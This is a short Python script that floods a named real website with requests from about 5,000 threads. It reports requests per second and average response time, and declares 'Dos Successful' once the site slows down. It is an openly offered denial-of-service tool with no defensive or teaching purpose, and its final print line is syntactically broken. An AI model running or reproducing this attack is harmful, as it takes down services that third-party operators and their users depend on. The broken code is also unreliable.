import requests
import threading
import time

l = []
rl = []

def current_mil_time():
    return round(time.time() * 1000)

def current_sec_time():
    return round(time.time())

def count_resp_per_sec(time_took):
    t = current_sec_time()
    l.append({
        "time_took" : time_took,
        "time_received" : t,
    })

    for e in l:
        if current_sec_time() - e["time_received"] >= 1:
            l.remove(e)

def count_req_per_sec():
    t = current_sec_time()
    rl.append({
        "time_received": t,
               })

    for e in rl:
        if current_sec_time() - e["time_received"] >= 1:
          rl.remove(e)


message = "Dosing ..."
def make_request(name):
    while True:
        count_req_per_sec()
        try:
            s = current_mil_time()
            r = requests.get('https://www.legacynow.com')
            t = current_mil_time() - s

            count_resp_per_sec(t)
        except:
            message = "Dos Successfull. Site looks down for now."

threads = 5000
i=0
while i <= threads:
    x = threading.Thread(target=make_request, args=(i,))
    print("Starting thread #{}...".format(i))
    x.start()
    i+=1


print("Calculating... wait for a while for it is to adjust")
while True:
    time.sleep(0.1)
    response_time = 0
    for e in l:
        response_time = response_time + e['time_took']
    if (len(l)) > 0:
        response_time = response_time / len(l)
    if response_time > 6000:
        message = "Dos Successful. Site looks down for now."

    else:
        message = "Dosing..."

    print("Average response time : {}ms; Requests/sec: {}; Responses/sec: {};{}.format(round(response_time, 2.), len(rl), len(l), message), end=""")

